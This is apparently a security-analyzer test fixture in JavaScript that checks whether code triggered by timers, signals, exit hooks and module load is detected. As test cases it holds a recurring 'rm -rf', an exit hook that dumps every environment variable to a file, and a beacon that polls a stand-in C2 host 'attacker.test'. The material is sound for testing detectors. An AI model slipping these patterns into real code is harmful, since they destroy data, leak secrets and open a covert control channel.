// Copyright © 2026 Sthenos Security. All rights reserved.
// ============================================================================
// INVOCATION PATTERNS TEST — Case 2: Internal Triggers (JavaScript)
//
// All functions execute automatically WITHOUT an external HTTP request.
// Triggered by setInterval, setTimeout, process events, IIFE, module-level.
//
// Expected:
//   app_reachability = REACHABLE (but RA currently says UNKNOWN/NOT_REACHABLE)
//   taint_verdict    = SAFE (constants, not user input)
// ============================================================================
'use strict';
const { execSync } = require('child_process');
const fs = require('fs');
const http = require('http');
const path = require('path');


// ── Subtype A: setInterval (repeating timer) ────────────────────────────

function cleanupExpiredSessions() {
    // CWE-78: shell command with constant — runs every 60s
    execSync('rm -rf /tmp/expired_sessions/*');
}

// Auto-starts on require()
setInterval(cleanupExpiredSessions, 60000);


// ── Subtype B: setTimeout (one-shot timer) ──────────────────────────────

function warmupCache() {
    // CWE-89: SQL with constant — runs 5s after require()
    const db = require('better-sqlite3')(':memory:');
    const table = 'warmup_cache';
    db.exec(`CREATE TABLE IF NOT EXISTS ${table} (k TEXT, v TEXT)`);
}

setTimeout(warmupCache, 5000);


// ── Subtype C: process.on('exit') (shutdown hook) ───────────────────────

process.on('exit', () => {
    // CWE-200: writes sensitive data to file at process exit
    try {
        const secrets = JSON.stringify(process.env);
        fs.writeFileSync('/tmp/shutdown_dump.json', secrets);
    } catch (e) { /* ignore */ }
});


// ── Subtype D: process.on('SIGUSR1') (signal handler) ──────────────────

process.on('SIGUSR1', () => {
    // CWE-78: shell command triggered by external signal
    execSync('tar czf /tmp/emergency_dump.tar.gz /var/log/app/');
});


// ── Subtype E: Module-level execution (IIFE) ───────────────────────────

// CWE-78: runs immediately on require() — no function call needed
(function telemetryPing() {
    try {
        execSync('curl -s https://telemetry.internal.example.com/ping');
    } catch (e) { /* ignore */ }
})();


// ── Subtype F: Malicious beacon (C2 pattern) ───────────────────────────

function beacon() {
    // CWE-918: SSRF-like C2 callback — constant URL, no user input
    http.get('http://c2-server.attacker.test/checkin', (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => { /* command received */ });
    });
}

// Beacons every 30 seconds
setInterval(beacon, 30000);


// ── Subtype G: Constructor auto-trigger ─────────────────────────────────

class AutoInitCache {
    constructor() {
        // CWE-89: SQL with computed constant — runs on instantiation
        const db = require('better-sqlite3')(':memory:');
        const ts = Date.now();
        db.exec(`CREATE TABLE IF NOT EXISTS cache_${ts} (k TEXT, v TEXT)`);
    }
}

// Instantiated at module level — constructor runs on require()
const _cache = new AutoInitCache();

module.exports = { cleanupExpiredSessions, warmupCache, beacon, AutoInitCache };
